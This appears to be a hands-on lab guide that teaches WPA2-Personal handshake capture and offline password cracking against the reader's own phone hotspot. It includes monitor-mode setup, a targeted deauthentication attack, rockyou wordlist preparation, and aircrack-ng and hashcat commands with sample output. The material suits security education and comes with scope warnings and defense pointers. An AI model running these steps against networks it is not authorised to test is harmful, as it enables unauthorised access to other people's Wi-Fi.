# The Lab

Nine steps. Keep a note of your **BSSID**, **channel**, and **client MAC** —
you'll reuse them constantly.

`wlan1` is your adapter below; `wlan1mon` is its monitor-mode version. Run
`iw dev` and substitute your own names.

> Only target a hotspot you made on your own phone. See `README.md`.

---

## Step 1 — Set up the target

On your phone, open hotspot settings and set:

1. **Name:** something unique, like `LabAP_test`.
2. **Security: WPA2-Personal.** Not WPA3, not "WPA2/WPA3".
3. **Band: 2.4 GHz.**
4. **Password:** something weak and memorable, like `sunflower22`. Write it
   down. Minimum 8 characters.

**Then connect your second device to the hotspot** and leave it there.

The handshake only happens when a device *joins* the network. No client means
no handshake, however long you listen.

> **Only offered WPA3?** Then this attack won't work, and that's the correct
> result — WPA3 is specifically designed to stop it. Look for a
> "compatibility" toggle to drop it to WPA2. If there isn't one, use a
> different phone, or skip to Step 6 and use the practice capture.

> **iPhone:** Personal Hotspot sleeps when you leave the settings screen.
> Keep that screen open and the phone unlocked.

---

## Step 2 — Enable monitor mode

Normally your card only hands you traffic addressed to you. Monitor mode
gives you every frame in the air, which is what you need.

Find your interface:

```bash
iw dev
```

Stop NetworkManager from fighting you for the adapter:

```bash
sudo nmcli device set wlan1 managed no
```

Switch it to monitor mode:

```bash
sudo airmon-ng start wlan1
```

Note the new name it prints — usually `wlan1mon`. Confirm it worked:

```bash
iw dev    # should say "type monitor"
```

If it doesn't say monitor, stop and check `docs/troubleshooting.md`. Nothing
below will work until this does.

---

## Step 3 — Find your hotspot

```bash
sudo airodump-ng wlan1mon
```

```
 BSSID              PWR  Beacons  #Data  CH  ENC  CIPHER AUTH ESSID

 DE:AD:BE:EF:1A:2B  -31       94    112   6  WPA2 CCMP   PSK  LabAP_test
```

Find your network and write down:

- **BSSID** — the AP's MAC address
- **CH** — the channel
- **ENC** — must say `WPA2`. If it says `WPA3`, go back to Step 1.

`PWR` is signal strength; closer to zero is stronger. If yours is below -70,
move closer.

`Ctrl-C` to stop.

---

## Step 4 — Start capturing

Now listen to only your network, on only its channel, and save to disk:

```bash
sudo airodump-ng -c 6 --bssid DE:AD:BE:EF:1A:2B -w capture wlan1mon
```

- `-c 6` — lock to the channel. **Essential.** Without this the card keeps
  hopping and will miss the handshake.
- `--bssid` — only your network
- `-w capture` — writes `capture-01.cap`

**Leave this running** for the rest of the lab.

The bottom section lists connected devices:

```
 BSSID              STATION            PWR  Frames

 DE:AD:BE:EF:1A:2B  AA:BB:CC:11:22:33  -38      87
```

That `STATION` is your second device. **Write down its MAC.**

No station listed? Your client isn't connected, or is idle — load a webpage
on it.

---

## Step 5 — Force a reconnect

You need to catch the device *joining*. Open a **second terminal** and leave
`airodump-ng` running in the first.

### Path A — deauth attack

```bash
sudo aireplay-ng --deauth 4 -a DE:AD:BE:EF:1A:2B -c AA:BB:CC:11:22:33 wlan1mon
```

- `--deauth 4` — four bursts, plenty
- `-a` — the AP
- `-c` — **the specific client. Never leave this out** — without it you kick
  every device on the network, and bystanders too.

**What happened:** deauth frames are management frames, and in WPA2 those
aren't encrypted or authenticated. You forged one claiming to be the AP, and
the client had no way to tell. It disconnected, then immediately reconnected
— redoing the handshake in front of your antenna.

`0 ACKs` in the output is normal, not an error.

### Path B — no injection needed

Turn Wi-Fi off on the client device, wait two seconds, turn it back on.

Same handshake. The deauth is just a way to cause this remotely — it's a
convenience, not the mechanism. Use this if `aireplay-ng` hangs on "Waiting
for beacon frame" (common on Intel cards).

### Watch for it

In the `airodump-ng` window, check the top right:

```
 CH 6 ][ Elapsed: 2 mins ][ WPA handshake: DE:AD:BE:EF:1A:2B
```

That's it. If it doesn't appear, deauth again — handshakes get missed, two or
three tries is normal.

Then `Ctrl-C` the `airodump-ng` window.

---

## Step 6 — Check you got it

> **No adapter? Start here:**
> ```bash
> cp samples/practice-handshake-01.cap capture-01.cap
> ```
> Its password is `sunflower22`. Everything below works the same.

`airodump-ng` sometimes claims a handshake it doesn't have. Verify:

```bash
aircrack-ng capture-01.cap
```

```
   1  DE:AD:BE:EF:1A:2B  LabAP_test      WPA (1 handshake)
```

`(1 handshake)` is what you want. `(0 handshakes)` means go back to Step 5.

Look at the actual frames:

```bash
tshark -r capture-01.cap -Y eapol
```

```
 8  1.000000 de:ad:be:ef:1a:2b → aa:bb:cc:11:22:33 EAPOL Key (Message 1 of 4)
 9  1.100000 aa:bb:cc:11:22:33 → de:ad:be:ef:1a:2b EAPOL Key (Message 2 of 4)
10  1.200000 de:ad:be:ef:1a:2b → aa:bb:cc:11:22:33 EAPOL Key (Message 3 of 4)
11  1.300000 aa:bb:cc:11:22:33 → de:ad:be:ef:1a:2b EAPOL Key (Message 4 of 4)
```

Four frames. **You only really need messages 1 and 2** — between them they
carry two random numbers and a signature computed from the password. That's
enough to test guesses against.

Notice what you *don't* need from here on: the AP. You could turn the hotspot
off, go home, and still crack it. That's the vulnerability.

---

## Step 7 — Get a wordlist

### A tiny one first

Prove the whole chain works using a list containing your known password:

```bash
printf '%s\n' password 123456789 letmein123 sunflower22 > wordlist.txt
```

Use your actual password. Yes, you're cracking something you already know —
that's so you can tell the difference between "bad wordlist" and "bad
capture" later.

Run Step 8 with this, then come back.

### Then a real one

`rockyou.txt` — 14 million real passwords from a 2009 breach. The standard
baseline. **This repo doesn't include it** — it's 134 MB and you should know
where yours came from.

On Kali/Parrot you already have it:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
```

Otherwise download it (53 MB compressed):

```bash
curl -L -o rockyou.txt.gz \
  https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz

sha256sum rockyou.txt.gz
# 8cd8016a87d71d736fca0fa13a445eb90bbe6d6fb5b27b95f5c10f604bc3bd0c

gunzip -k rockyou.txt.gz
```

Check the hash before using it.

### Trim it

WPA2 passwords are 8–63 characters, so anything shorter is wasted work:

```bash
LC_ALL=C awk 'length($0) >= 8 && length($0) <= 63' rockyou.txt > wpa-candidates.txt
LC_ALL=C wc -l rockyou.txt wpa-candidates.txt
```

```
 14344394 rockyou.txt
  9609473 wpa-candidates.txt
```

You just dropped 4.7 million impossible guesses — **33% less work, with no
chance of losing the right answer.** Knowing the target's constraints beats
having a faster computer.

(`LC_ALL=C` matters — rockyou contains invalid UTF-8, which makes `awk` slow
and noisy without it.)

Make sure your password is in there:

```bash
grep -cx 'sunflower22' wpa-candidates.txt   # 0 means append it
```

---

## Step 8 — Crack it

```bash
aircrack-ng -w wordlist.txt -b DE:AD:BE:EF:1A:2B capture-01.cap
```

```
      [00:00:00] 5/7 keys tested (54.70 k/s)

                      KEY FOUND! [ sunflower22 ]

      Master Key : 7D 6B 33 55 44 20 7D 11 CB 46 6E A6 02 C9 AB C2
                   32 73 30 97 CF F1 5B F2 7A 86 F5 40 11 F7 7A C5
```

**That's the attack.** A Wi-Fi password recovered from four frames of radio
traffic and a list of guesses.

> **`k/s` means keys per second, not thousands of keys per second.**
> `9035.45 k/s` is about nine thousand guesses a second. Everyone misreads
> this.

Now try the big list:

```bash
time aircrack-ng -w wpa-candidates.txt -b DE:AD:BE:EF:1A:2B capture-01.cap
```

9.6M candidates at ~12,000/sec is about **13 minutes** on a 12-core desktop,
closer to **40 minutes** on a 4-core laptop.

A few thousand guesses a second is *slow* for a hash — deliberately. Each one
costs 4096 rounds of HMAC-SHA1. Compare: commodity hardware does billions of
MD5s per second.

Worth doing the maths at your own rate: how long for a 10-character random
password? (That's 26¹⁰ ≈ 1.4×10¹⁴ guesses.) That gap is the entire security
of WPA2.

<details>
<summary>Optional: hashcat, if you have a GPU</summary>

Needs `hcxtools` and `hashcat` installed, and a format conversion first:

```bash
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt
hashcat -m 22000 hash.hc22000 --show
```

Typically 50–500× faster than `aircrack-ng`, which is CPU-only.
</details>

---

## Step 9 — Clean up

```bash
sudo airmon-ng stop wlan1mon
sudo nmcli device set wlan1 managed yes
iw dev    # should say "type managed" again
```

**Turn off the hotspot and change its password** — you just wrote the old one
into a file.

Delete the captures when you're done with them:

```bash
rm -f capture-0*
```

---

## Then

Read **[`docs/how-it-works.md`](docs/how-it-works.md)** — it explains why
four frames were enough, and it'll make much more sense now than it would
have an hour ago.

Then **[`docs/defenses.md`](docs/defenses.md)** for what actually stops this.
